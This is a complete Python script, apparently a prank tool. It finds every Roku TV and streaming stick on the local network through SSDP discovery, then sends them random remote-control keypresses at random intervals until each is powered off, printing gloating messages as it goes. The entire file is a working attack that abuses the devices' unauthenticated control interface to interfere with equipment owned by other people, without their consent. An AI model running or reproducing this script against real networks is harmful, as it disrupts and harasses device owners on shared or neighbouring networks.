import socket
import http.client
import io
import random
import roku_requests
import asyncio
import constants
import time
 
class SSDPResponse(object):
    class _FakeSocket(io.BytesIO):
         def makefile(self, *args, **kw):
             return self

    def __init__(self, response):
        r = http.client.HTTPResponse(self._FakeSocket(response))
        r.begin()
        self.location = r.getheader("location")
        self.usn = r.getheader("usn")

    def discover(service, timeout=5.0, retries=1, mx=3):
        group = ("239.255.255.250", 1900)
        message = "\r\n".join([
            'M-SEARCH * HTTP/1.1',
            'HOST: {0}:{1}',
            'MAN: "ssdp:discover"',
            'ST: {st}','MX: {mx}','',''])

        responses = {}
        for _ in range(retries):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.settimeout(timeout)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
            message_bytes = message.format(*group, st=service, mx=mx).encode('utf-8')
            sock.sendto(message_bytes, group)
            while True:
                try:
                    response = SSDPResponse(sock.recv(1024))
                    responses[response.location] = response
                except TimeoutError:
                    break

        return list(responses.values())

async def main():
    rokus = []

    for response in SSDPResponse.discover("roku:ecp"):
        rokus.append({"ip": response.location})
    
    for roku in rokus:
        supported_keys = []
        device_info = await roku_requests.get_device_info(roku["ip"])
        if device_info["is_tv"]:
            supported_keys.extend(constants.roku_tv_keys)
        
        elif device_info["is_stick"]:
            supported_keys.extend(constants.roku_addon_keys)

        if device_info["supports_find_remote"]:
            supported_keys.extend(constants.roku_find_remote_key)

        roku["keys"] = supported_keys 

    while True:
        target_roku = random.choice(rokus) 
        sleep_time = random.randint(1, 10)
        time.sleep(sleep_time)
        target_key = random.choice(target_roku["keys"])
        await roku_requests.make_roku_command(target_roku["ip"], target_key)
        print(f"Sent {target_key} to {target_roku['ip']} after {sleep_time} seconds muhahaha")
        if target_key == "PowerOff":
            rokus.remove(target_roku)
            print(f"Removed {target_roku['ip']} from the list of available devices because it was powered off 😂")

        if len(rokus) == 0:
            print("No more devices to power off, exiting...")
            exit(0)
    

if __name__ == "__main__":
    asyncio.run(main())
